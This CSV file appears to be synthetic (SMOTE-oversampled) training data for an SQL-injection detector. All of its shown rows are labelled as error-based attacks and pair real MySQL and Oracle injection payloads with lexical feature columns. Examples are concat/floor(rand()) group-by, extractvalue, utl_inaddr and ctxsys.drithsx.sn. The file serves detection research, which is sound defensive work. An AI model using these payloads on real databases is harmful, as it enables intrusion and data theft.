id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000139,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000037,0.18723530994242757,314.8975685374841,38.0,4.01905139354999,109.94249792310654,55.0,114.61005815301684,35.34501246136075,0.3493441181813985,0.1747551545775395,0.36369575575872654,0.11220497148233549,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.34501246136075,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.9424979231065418,0.057502076893458376,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000140,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,0.3197692107910655,226.2048789020833,32.22717745654762,3.459933211032105,58.77282254345238,32.45435491309525,104.20487890208331,30.772822543452374,0.2598155749031204,0.14362851730896894,0.46054880407962945,0.13600710370828126,0.0,3.8296169075892803,0.11358872827381317,0.0,1.0,1.0567943641369064,0.0,19.772822543452374,0.0,0.0,4.0,2.1703830924107193,0.0,1.0,0.056794364136906625,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.05679436413690653,1.0,1.9432056358630934,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000141,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000058,1.6588606361963083,283.37546329190747,35.0066913755684,3.687273144857222,89.81858659957608,34.2550185316763,120.033456877842,39.268401282813095,0.3134414742229663,0.12212087378343321,0.4259878499521523,0.13844980204144822,0.0,4.0,0.0,0.0,1.7516728438920999,1.7516728438920997,0.0,23.006691375568398,1.5033456877841993,1.5033456877841993,4.751672843892099,3.503345687784199,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.7516728438920999,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.7516728438920997,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7516728438920997,0.0,0.0,0.0,9.2550185316763
SMOTE_000142,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000037,0.6742540078335028,312.7194860264261,37.71948602642611,4.0272362438981,109.71948602642611,55.0,113.0,35.0,0.3508545881805982,0.17587683571461626,0.3613469533773025,0.11192162272748306,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.7194860264261096,0.2805139735738904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000143,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000057,1.0070573313369606,289.21895033068097,37.378016365231595,4.017172638834781,107.4754260696457,41.34137697395092,104.06077031313343,36.34137697395092,0.37187263890037797,0.14287632026836014,0.35976592013745273,0.12548512069380913,3.170688486975461,0.0,0.0,0.0,2.0,1.7926721217438653,0.0,19.585344243487732,0.0,2.0,5.207327878256135,5.378016365231596,0.7926721217438651,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.7926721217438653,0.0,0.7926721217438651,2.0,-1.1102230246251565e-16,0.7926721217438653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.378016365231595
SMOTE_000144,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000037,0.00043042485910804094,312.9968252917446,37.99983719444844,4.029536332099328,109.99983719444845,54.99837194448442,112.99869755558754,34.99991859722422,0.35144117744187936,0.17571494400291118,0.3610217937656743,0.11182208478953522,4.0,0.0,0.0,0.0,2.0,2.0,0.0,19.999837194448443,0.0,0.0001628055515581206,5.999918597224221,4.999918597224221,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.999755791672664,2.999755791672663,0.0,1.0000814027757792,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,8.140277577900479e-05,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.999674388896882
SMOTE_000145,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,0.27952874833777586,343.44276000485706,33.76641400072856,3.70436230756739,102.8320700036428,45.0,137.8442760004857,57.76641400072856,0.29930004112153075,0.13105976187096038,0.4014374523032089,0.16820274470430005,3.688552000971413,0.0,0.0,0.0,0.0,2.0,0.0,28.077861999757147,0.0,3.0,0.0,22.0,0.9221380002428532,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.9221380002428532,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.922138000242853
SMOTE_000146,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,0.27542332625569815,252.31504389463186,36.0,3.9989599058070344,94.36164115214166,35.482188202855546,91.16984691284995,31.301367626784714,0.37458299673414547,0.14061559826409473,0.36066969159106693,0.12413171341069285,0.939726474643057,0.0,0.0,0.0,2.0,1.0602735253569429,0.0,18.361641152141658,0.0,2.0,5.939726474643058,3.0602735253569433,0.939726474643057,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.12054705071388594,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.120547050713887
SMOTE_000147,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.6858739404357614e-07,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000148,attack,error,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000010,1.0396691799506843,336.25850962810125,38.41572115243319,3.8224045154315736,101.41572115243319,55.0,137.67423078053446,42.168557695133615,0.30167261168819137,0.16359322881157304,0.40934590907961116,0.12538825042062443,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.168557695133615,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.4157211524331927,0.5842788475668073,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000149,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,1.3041149666865144,333.4056016629796,32.93706777531976,3.454743079668604,80.53146611234011,50.40560166297965,146.0,56.46853388765988,0.24155361458906283,0.15116692385023592,0.4379138838087122,0.16936557775198902,0.0,0.0,0.468533887659882,0.0,0.0,2.0,0.0,31.0,0.0,0.0,1.0,22.46853388765988,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.531466112340118,0.468533887659882,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000150,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.1330568544901342,333.3009174524534,33.66018349049068,3.4802674355700214,80.0,52.0,144.64073396196272,56.66018349049068,0.24003551880419471,0.15602308722272656,0.433945833823603,0.16999556014947567,0.0,0.0,1.0,0.0,0.0,2.0,0.0,30.66018349049068,0.0,0.0,1.0,23.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000151,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,0.15421904394493768,248.98360675560977,35.06345850036192,3.9911380842793847,94.25383400144769,35.253834001447686,89.38075100217152,30.09518775054288,0.3786057896481054,0.14154128506059493,0.358970477039098,0.12088244825220172,0.0,0.0,0.06345850036192119,0.0,2.0,1.0317292501809605,0.0,18.03172925018096,0.0,2.0,5.968270749819039,3.095187750542882,0.0,0.0,0.03172925018096048,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.031729250180960455,2.0,0.0317292501809604,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.063458500361921
SMOTE_000152,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",nearest_attack_euclidean,R000070,0.14849922158134019,195.1153890142694,29.086541760702033,3.5514936019189274,51.144236267836725,35.34616704280813,82.56729119648983,26.05769450713469,0.2621116153202016,0.18112263774895393,0.4232198040234805,0.13354594290736402,4.0,0.0,0.0,0.0,0.0,1.0288472535673445,0.0,15.884610985730623,0.0,0.0,5.028847253567345,1.1442362678367228,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.028847253567344577,1.0288472535673445,0.0,0.028847253567344522,0.028847253567344522,0.9711527464326555,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0576945071346895
SMOTE_000153,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000053,1.1143798250208607,340.60646342577013,33.564811531958206,3.515840798059065,83.3472172979373,49.0,147.5648115319582,60.69443459587461,0.2446973252083653,0.1438870639303915,0.4332868538449514,0.17812875701629177,3.1296230639164095,0.0,0.0,0.0,0.0,2.782405765979102,0.0,30.2175942340209,1.5648115319582048,0.0,1.0,22.7824057659791,0.7824057659791025,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.7824057659791026,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.782405765979103
SMOTE_000154,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,1.9412731004180923,196.08047275644944,28.45976362177528,3.4957979819526326,48.2988181088764,37.7011818911236,85.16094551289888,24.919527243550558,0.24639243578425032,0.19221434133264018,0.4342758072687746,0.12711741561433484,1.8390544871011167,0.0,0.0,0.0,0.5402363782247208,1.5402363782247208,0.0,16.0,0.0,0.0,4.459763621775279,2.080472756449442,0.4597636217752793,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.080472756449441,0.0,0.0,0.5402363782247209,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.620709134674162
SMOTE_000155,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,0.8225110881655153,232.53784270071802,40.395560192908434,3.880807919515182,70.67558106099636,42.58224077163372,94.58224077163372,24.697780096454217,0.3036451147575048,0.18278918248361514,0.40712892844747195,0.10643677431140816,1.0,0.0,1.0,0.0,1.0,1.6977800964542151,0.0,16.0,0.0,0.0,3.0,3.697780096454215,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.6977800964542151,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.697780096454215
SMOTE_000156,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000053,1.063793358319827,340.5920113242172,33.75920113242172,3.518085157476411,83.27760339726517,49.0,147.51840226484344,60.79600566210861,0.24449950545905413,0.14389017103208182,0.4331608077540265,0.17844951575483753,3.277603397265168,0.0,0.0,0.0,0.0,2.7592011324217225,0.0,30.240798867578278,1.5184022648434454,0.0,1.0,22.759201132421722,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.759201132421723,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.7592011324217225
SMOTE_000157,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,0.4157908323241714,330.80325743397947,33.80325743397945,3.4905313542452627,80.0,52.0,142.0,56.80325743397944,0.24183593706199438,0.15719335909029633,0.42925878828504,0.17171191556266932,0.8032574339794448,0.0,1.0,0.0,0.0,2.0,0.0,30.0,0.0,0.0,1.0,23.0,0.8032574339794448,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000158,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000034,0.882963473461218,331.6013298751128,35.401994812669194,3.6410584020949326,89.60797925067676,48.79734024977441,136.39534543710522,56.80066493755639,0.2701946582942161,0.14716915962869376,0.41134606746968516,0.171290114607405,0.0,0.0,2.601329875112795,0.0,0.0,2.0,0.0,28.398670124887204,0.0,2.4019948126691917,0.19933506244360277,24.601329875112793,0.0,0.0,0.8006649375563972,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000159,attack,error,"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000052,1.582960795281914,220.33473133178316,33.70362603712316,3.9237965711223426,72.77824377726105,42.629008296985255,80.74198340602948,24.18549585150737,0.3303035530003897,0.19433424241783787,0.3657468180672885,0.10961538651448391,0.0,1.8891218886305285,1.4072520742463142,0.0,0.0,2.0,0.0,13.889121888630529,0.0,0.0,5.0,3.4072520742463146,0.0,1.0,0.7036260371231572,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.7036260371231571,0.0,0.2963739628768428,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000160,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000045,0.324874744257947,349.57370799050244,34.0,3.5536012700991195,86.6820672151961,56.65896639240195,147.3179327848039,58.91474159810049,0.24799490383549005,0.16206987065740824,0.42140263099036857,0.16853259451673314,0.08525840189951284,0.9147415981004872,2.0,0.0,0.0,3.0,0.0,29.829483196200975,0.0,0.2557752056985385,0.9147415981004872,25.0,0.08525840189951284,0.9147415981004872,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000161,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000032,3.189829845284439,198.18646790932362,31.27288226364412,3.732171978011744,68.63899848195005,27.54746942737357,78.0,24.0,0.3453941570663588,0.13774028615734957,0.3952501316524583,0.12161542512383333,4.0,0.0,0.0,0.0,0.0,0.2728822636441208,0.0,15.454235472711758,0.0,0.0,4.272882263644121,0.2728822636441208,1.0,0.0,0.0,0.0,0.0,0.2728822636441206,1.0,0.0,0.0,1.0,0.0,0.2728822636441208,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7271177363558792,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.27288226364412077,0.27288226364412077,3.5457645272882408
SMOTE_000162,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,0.7426425335939755,334.25135909248087,32.34636293730475,3.4848133500162297,84.98317377900459,48.30727412539051,144.614548250781,56.34636293730475,0.2539292265421562,0.14461933310719474,0.43287350787285744,0.16857793247779157,0.692725874609494,0.0,0.0,0.0,0.0,2.0,0.0,30.48045559404288,0.0,0.5195444059571203,0.8268185313476266,22.0,0.1731814686523736,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1731814686523736,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.173181468652373
